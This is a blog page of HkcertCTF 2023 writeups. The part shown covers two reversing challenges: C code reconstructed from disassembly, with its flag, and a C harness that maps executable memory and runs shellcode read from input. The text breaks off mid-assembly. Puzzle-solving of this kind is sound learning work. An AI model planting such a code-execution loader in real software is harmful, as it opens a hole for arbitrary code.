<!DOCTYPE html>
<html class="" lang="en-us"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            HkcertCTF 2023 Writeups  &ndash;
        
        Blogs
    </title>
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
    
    
    <link type="text/css" rel="stylesheet" href=https://bott0n.github.io/css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css integrity="sha512-b4RRStYyYA&#43;6MVJSo4418wIY89XsJowSNvYnghdpFwAucEwrFCotlJvYMcb&#43;q8PW2zWjxtbhUbg5uf6AzBn6Tw==" />
<meta name="author" content="botton" />

    
    
        <meta name="description" content="" />
    

<meta property="og:site_name"
    content='Blogs' />

    <meta property="og:title" content="HkcertCTF 2023 Writeups" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="botton" />
    <meta
        property="article:published_time"
        content='2023-11-18T16:38:33Z&#43;0800' />
    
    <meta property="og:url" content="https://bott0n.github.io/posts/hkcertctf-2023-writeups/" />
    <meta property="og:image"
        content='https://bott0n.github.io/icon512.png
    ' />
    
        <meta property="og:description" content="" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='bott0n.github.io'
/>
<meta property="twitter:url" content="https://bott0n.github.io/posts/hkcertctf-2023-writeups/" />


    <meta name="twitter:title" content="HkcertCTF 2023 Writeups" />
    
    <meta name="twitter:image"
        content='https://bott0n.github.io/icon512.png
    ' />
    
        <meta name="twitter:description" content="" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' />
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">Blogs</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
        
            <li><a href="https://bott0n.github.io/about/aboutme/">About</a></li>
        
        
            <li><a href="/tags">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="/index.xml">
    
    
        &#xf09e;
    
    <span>
        RSS
    </span>
</a>

        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/bott0n">
    
    
        &#xf09b;
    
    <span>
        GitHab
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://twitter.com/botton3310">
    
    
        &#xf099;
    
    <span>
        Titter
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>HkcertCTF 2023 Writeups</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2023-11-18

</p>
    
    
    
    <div class="articleToc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#rev">Rev</a>
      <ul>
        <li><a href="#decompetition-vitamin-c---200-points-10-solves">Decompetition: Vitamin C&ndash; (200 points, 10 solves)</a>
          <ul>
            <li><a href="#solve-script">Solve Script</a></li>
          </ul>
        </li>
        <li><a href="#isa-atom-400-points-33-solves">ISA Atom (400 points, 33 solves)</a>
          <ul>
            <li><a href="#simulatorc">Simulator.c</a></li>
            <li><a href="#translated-x86-asm">Translated x86 ASM</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#rop-revenge-300-points-13-solves">ROP Revenge (300 points, 13 solves)</a>
          <ul>
            <li><a href="#solvec">solve.c</a></li>
            <li><a href="#exploit-script">Exploit script</a></li>
          </ul>
        </li>
        <li><a href="#mips-rop-300-points-14-solves">mips rop (300 points, 14 solves)</a>
          <ul>
            <li><a href="#exploit-script-1">Exploit Script</a></li>
          </ul>
        </li>
        <li><a href="#absolute-winner-300-points-6-solves">Absolute Winner (300 points, 6 solves)</a>
          <ul>
            <li><a href="#exploit-script-2">Exploit Script</a></li>
          </ul>
        </li>
        <li><a href="#return-of-babyuxss-return-500-points-2-solves">Return of babyUXSS return (500 points, 2 solves)</a></li>
      </ul>
    </li>
  </ul>
</nav>
    <hr />
</div>

    <div><h1 id="introduction">Introduction</h1>
<p>This year, I joined hkcertctf 2023 with team &ldquo;Mystiz&rsquo;s fan club&rdquo; and placed 3th in the open division. In this post, I will provide a brief write-up on some of the challenges I have solved.</p>
<h1 id="rev">Rev</h1>
<h2 id="decompetition-vitamin-c---200-points-10-solves">Decompetition: Vitamin C&ndash; (200 points, 10 solves)</h2>
<p>This chal is a Decompetition. To recover original source code form the provided asm.
We are required to obtain 95% or above similarity and reverse the soruce code to get internal flag.</p>
<p>If we put the binary in ida and ghidra, we can follow to disassembly result to get most of the source code.
However, there are two tricky parts for me to recover.</p>
<p>The First one is the variables declare sequence, here are the result from ghidra and ida:</p>
<p><em>Ghidra</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  <span style="color:#66d9ef">int</span> iVar1;
  <span style="color:#66d9ef">int</span> iVar2;
  <span style="color:#66d9ef">int</span> iVar3;
  <span style="color:#66d9ef">int</span> iVar4;
  <span style="color:#66d9ef">int</span> iVar5;
  size_t sVar6;
  <span style="color:#66d9ef">int</span> local_4c;
  <span style="color:#66d9ef">int</span> local_48;
  undefined4 local_41;
  undefined2 local_3d;
  undefined8 local_3b;
  undefined4 local_33;
  undefined4 local_2f;
  undefined2 local_2b;
  undefined8 local_29;
  undefined local_21;
  <span style="color:#66d9ef">int</span> local_20;
  <span style="color:#66d9ef">int</span> local_1c;
  
  local_29 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  local_21 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  local_2f <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  local_2b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  local_33 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  local_3b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  local_41 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  local_3d <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</code></pre></div><p><em>ida</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">check</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>key)
{
  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// ebx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// ebx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// ebx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// ebx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> year; <span style="color:#75715e">// [rsp+24h] [rbp-44h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> dummy; <span style="color:#75715e">// [rsp+28h] [rbp-40h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> e[<span style="color:#ae81ff">6</span>]; <span style="color:#75715e">// [rsp+2Fh] [rbp-39h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> d[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+35h] [rbp-33h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> c[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [rsp+3Dh] [rbp-2Bh] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> b[<span style="color:#ae81ff">6</span>]; <span style="color:#75715e">// [rsp+41h] [rbp-27h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> a[<span style="color:#ae81ff">9</span>]; <span style="color:#75715e">// [rsp+47h] [rbp-21h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> sum; <span style="color:#75715e">// [rsp+50h] [rbp-18h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+54h] [rbp-14h]
</span><span style="color:#75715e"></span>
  memset(a, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(a));
  memset(b, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(b));
  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)d <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
  memset(e, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(e));
</code></pre></div><p>The both result are really confuse me because if I follow the order to declare the variables in c code, the stack frame allocation is completely different.
After a large amount of trial and errors, I accidently find the correct order:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> i;      
<span style="color:#66d9ef">int</span> sum;
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  a[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  b[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  c[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  e[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
<span style="color:#66d9ef">int</span> dummy;
<span style="color:#66d9ef">int</span> year;    
</code></pre></div><p>The second tricky part is the following asm:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">rbp-0x18</span>]
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">movsxd</span>  <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">imul</span>    <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>, -<span style="color:#ae81ff">0x6db6db6d</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">shr</span>     <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">sar</span>     <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">cdq</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">sub</span>     <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">shl</span>     <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">sub</span>     <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">sub</span>     <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">+</span>  <span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">rbp-0x2d</span>]
</code></pre></div><p>Both ida and ghidra are failed to disasm this asm, and I tried to recover it by c code but none of them are work.
Finally, I asked help for my teammate and @TWY suggested that it looks like the <code>mod 7</code> logic.
I tried it and we got 1.0 similarity.</p>
<p>The internal is <code>internal{27723-CTF-0462833-aaaaa}</code> which is also reversed by @TWY, I have no effort on it lol.</p>
<h3 id="solve-script">Solve Script</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ctoi</span>(<span style="color:#66d9ef">char</span> c)
{
  <span style="color:#66d9ef">return</span> c <span style="color:#f92672">-</span> <span style="color:#ae81ff">48</span>;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">check</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>key)

{
  <span style="color:#66d9ef">int</span> i;
  <span style="color:#66d9ef">int</span> sum;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  a[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  b[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  c[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  e[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
  <span style="color:#66d9ef">int</span> dummy;
  <span style="color:#66d9ef">int</span> year;



  
  __isoc99_sscanf(key,<span style="color:#e6db74">&#34;%8c{%5c-%3c-%7c-%5c}&#34;</span>, a, b, c, d, e);

  <span style="color:#66d9ef">if</span> ( strlen((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)a) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">8</span>
    <span style="color:#f92672">||</span> strlen((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)b) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">5</span>
    <span style="color:#f92672">||</span> strlen((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)c) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span>
    <span style="color:#f92672">||</span> strlen((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)d) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">7</span>
    <span style="color:#f92672">||</span> strlen((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)e) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">5</span> )
  {
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  <span style="color:#66d9ef">if</span> (strcmp((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)a,<span style="color:#e6db74">&#34;internal&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  __isoc99_sscanf(<span style="color:#f92672">&amp;</span>b,<span style="color:#e6db74">&#34;%3d%2d&#34;</span>,<span style="color:#f92672">&amp;</span>dummy, <span style="color:#f92672">&amp;</span>year);
  
  <span style="color:#66d9ef">if</span> ( dummy <span style="color:#f92672">!=</span> <span style="color:#ae81ff">277</span> )
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  <span style="color:#66d9ef">if</span> ( year <span style="color:#f92672">!=</span> <span style="color:#ae81ff">23</span> )
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  <span style="color:#66d9ef">if</span> ( strcmp((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)c, <span style="color:#e6db74">&#34;CTF&#34;</span>) )
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  <span style="color:#66d9ef">if</span> ( ctoi(d[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>ctoi(d[<span style="color:#ae81ff">7</span>]) <span style="color:#f92672">||</span> ctoi(d[<span style="color:#ae81ff">7</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">8</span> )
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;

  sum <span style="color:#f92672">=</span> ctoi(d[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">*</span> ctoi(d[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span> <span style="color:#f92672">*</span> ctoi(d[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">+</span>  <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> ctoi(d[<span style="color:#ae81ff">4</span>]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span> <span style="color:#f92672">*</span> ctoi(d[<span style="color:#ae81ff">5</span>]);

  <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x38264</span>) {
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  <span style="color:#66d9ef">if</span> (sum <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">!=</span> ctoi(d[<span style="color:#ae81ff">6</span>])) {
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }
  <span style="color:#66d9ef">if</span> (e[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;a&#39;</span>) {
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>; <span style="color:#f92672">++</span>i )
  {
    <span style="color:#66d9ef">if</span> ( e[i] <span style="color:#f92672">!=</span> e[<span style="color:#ae81ff">0</span>] )
      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }


  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;

}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
{
    <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )
    {
        puts(<span style="color:#e6db74">&#34;No internal flag given?&#34;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;

    }
    <span style="color:#66d9ef">else</span>
    {
        <span style="color:#66d9ef">if</span> ( check((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)argv[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
            {
                puts(<span style="color:#e6db74">&#34;Invalid flag :(&#34;</span>);
                <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;

            }
            <span style="color:#66d9ef">else</span>
            {
                puts(<span style="color:#e6db74">&#34;Correct!&#34;</span>);
                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
                
            }
    }
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><h2 id="isa-atom-400-points-33-solves">ISA Atom (400 points, 33 solves)</h2>
<p>This chal reverse the ISA asm from bauhina ISA platform.
If we directly run the asm on the platform, it stopped because of the execution step count is exceeded the limitation.</p>
<p>To solve it, I did not reverse the asm.
I translate the ISA asm to a x86 asm based the following rules:</p>
<pre tabindex="0"><code>R1 = ecx,
R2 = edx,
R3 = esi,
R4 = edi,
R5 = ebx,
R6 = [0x4000600]
FP = ebp,
SP = esp
</code></pre><p>After the tranlstation, I made a c simulator to run the tranlsted asm and run it.
We retrieved the flag after waiting for a few minutes.</p>
<h3 id="simulatorc">Simulator.c</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">void</span> (<span style="color:#f92672">*</span>void_fn)(<span style="color:#66d9ef">void</span>);

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_abort</span>(<span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span> err_msg) {
    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, err_msg);
    exit(<span style="color:#ae81ff">1</span>);
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
  setvbuf(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  setvbuf(stderr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    <span style="color:#66d9ef">int</span> SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
    <span style="color:#66d9ef">int</span> readed_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> rbx, rcx, rdx, rbp, rsp, rsi, rdi, r8, r9, r10, r11, r12, r13;
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>shellcode;
    init();
    shellcode <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>) mmap((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x400000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>, SIZE, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE<span style="color:#f92672">|</span>PROT_EXEC, MAP_ANONYMOUS<span style="color:#f92672">|</span>MAP_PRIVATE, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
    shellcode <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>) mmap((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x400000</span>, SIZE, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE<span style="color:#f92672">|</span>PROT_EXEC, MAP_ANONYMOUS<span style="color:#f92672">|</span>MAP_PRIVATE, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);

    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">long</span>)shellcode <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
        _abort(<span style="color:#e6db74">&#34;mmap failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    memset(shellcode, <span style="color:#e6db74">&#39;\0&#39;</span>, SIZE);

    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Input your shellcode here (max: 100): &#34;</span>);
    <span style="color:#66d9ef">if</span> ((readed_len <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, shellcode, SIZE <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
        _abort(<span style="color:#e6db74">&#34;read failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    
    ((void_fn) shellcode)();
}
</code></pre></div><h3 id="translated-x86-asm">Translated x86 ASM</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">JMP</span> <span style="color:#ae81ff">0x0000b3</span>
<span style="color:#a6e22e">PUSH</span> <span style="color:#66d9ef">ebp</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">esp</span>
<span style="color:#a6e22e">SUB</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">4</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">12</span>]
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">edi</span>, [<span style="color:#66d9ef">ebp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">8</span>]
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">esi</span>, <span style="color:#66d9ef">edi</span>
<span style="color:#a6e22e">AND</span> <span style="color:#66d9ef">esi</span>, <span style="color:#66d9ef">edx</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esi</span>
<span style="color:#a6e22e">SHL</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">1</span>
<span style="color:#a6e22e">MOV</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">edi</span>
